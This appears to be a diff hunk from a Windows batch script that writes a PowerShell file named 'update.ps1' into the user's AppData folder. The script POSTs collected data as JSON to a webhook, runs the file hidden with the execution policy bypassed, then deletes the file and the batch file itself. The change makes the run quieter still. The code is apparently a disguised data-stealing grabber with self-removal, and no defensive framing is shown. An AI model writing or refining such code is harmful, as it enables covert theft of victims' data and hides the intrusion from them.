@@ -80,7 +80,7 @@ echo     $JSON = $hash ^| convertto-json>>%appdata%\update.ps1
 echo     Invoke-WebRequest -uri $webhook_url -Method POST -Body $JSON -Headers @{'Content-Type' = 'application/json'}>>%appdata%\update.ps1
 echo }>>%appdata%\update.ps1
 timeout /t 2 >nul
-PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\update.ps1 -WindowStyle Hidden
+PowerShell.exe -ExecutionPolicy Bypass -File %appdata%\update.ps1 -WindowStyle Hidden >nul
 timeout /t 6 >nul
 del %appdata%\update.ps1
 (goto) 2>nul & del "%~f0"
